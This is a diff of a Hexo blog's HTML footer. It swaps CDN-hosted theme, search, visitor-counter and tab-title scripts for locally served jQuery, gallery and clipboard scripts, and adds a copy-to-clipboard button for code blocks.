-</div>
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
 
 
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
 
+<!-- clipboard -->
 
-    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-<script>
-var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
 
-
-</script>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
-
-
-<div class="search-panel" id="search-panel">
-    <ul class="search-result" id="search-result"></ul>
-</div>
-<template id="search-tpl">
-<li class="item">
-    <a href="{path}" class="waves-block waves-effect">
-        <div class="title ellipsis" title="{title}">{title}</div>
-        <div class="flex-row flex-middle">
-            <div class="tags ellipsis">
-                {tags}
-            </div>
-            <time class="flex-col time">{date}</time>
-        </div>
-    </a>
-</li>
-</template>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
-
-
-
-
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-<script>
-(function() {
-    var OriginTitile = document.title, titleTime;
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            document.title = '死鬼去哪里了！';
-            clearTimeout(titleTime);
-        } else {
-            document.title = '(つェ⊂)咦!又好了!';
-            titleTime = setTimeout(function() {
-                document.title = OriginTitile;
-            },2000);
-        }
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
     });
-})();
-</script>
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
 
 
 </body>
